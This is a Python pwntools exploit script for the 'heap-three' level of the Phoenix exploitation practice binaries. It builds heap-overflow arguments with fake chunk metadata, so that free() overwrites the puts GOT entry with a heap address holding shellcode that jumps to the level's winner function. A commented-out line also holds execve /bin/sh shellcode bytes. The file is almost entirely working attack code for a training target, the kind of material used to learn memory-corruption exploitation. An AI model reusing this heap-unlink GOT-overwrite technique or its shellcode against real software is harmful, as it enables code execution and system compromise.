from pwn import *


arch = "i486"


def run(level, payload):
    write("/tmp/docgil", payload)
    print("payload: ")
    print(read("/tmp/docgil"))
    io = process("cat /tmp/docgil  | /opt/phoenix/" + arch + "/"+level, shell=True)
    return io.recvall()


def run_with_arg(level, arg):
    write("/tmp/docgil", arg)
    print("payload: ")
    print(read("/tmp/docgil"))
    io = process("/opt/phoenix/" + arch + "/"+level+" \"`cat /tmp/docgil`\"", shell=True)
    return io.recvall()


def run_with_args(level, args):
    index = 0
    args_string = ""
    for arg in args:
        filename = "/tmp/docgil" + str(index)
        write(filename, arg)
        print("payload"+str(index)+": ")
        print(read(filename))
        args_string += " \"`cat " + filename + "`\""
        index += 1

    io = process("/opt/phoenix/" + arch + "/" + level + args_string, shell=True)
    return io.recvall()


# we perform multiple frees, so lets place shellcode below, so the other free
# adr overwriting wont bother us
heap_shellcode_adr = pack(0xf7e69008+0xc, 32)
# offset used by free impl = +12 hardcoded
puts_got_adr_with_off = pack(0x804c13c-0xc, 32)
current_chunk_size = pack(0x65, 32)
next_chunk_size_offed = pack(0xfffffffc, 32)
winner_function = pack(0x080487d5, 32)

# shellcode = "\xCC"*16
# shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

# calls winner function
# mov adr in eax and call eax
# only 7 bytes big, so the write into the heap at +8 does not bother us
shellcode = b"\xB8" + winner_function + b"\xFF\xD0"
# chunk used to place shell code
arg1 = b""
arg1 += 12*b"A"
arg1 += shellcode

arg2 = b""
arg2 += 32 * b"B"
# current chunk starts here
# first meta data field just set to B's
arg2 += b"B"*4
arg2 += current_chunk_size

arg3 = b""
# size 100 is with 8 bytes metadata, so 92 bytes of payload
arg3 += 92 * b"C"
# next fake freed chunk starts here
arg3 += next_chunk_size_offed
arg3 += next_chunk_size_offed
arg3 += puts_got_adr_with_off
arg3 += heap_shellcode_adr

r = run_with_args("heap-three", [arg1, arg2, arg3])
print(r)
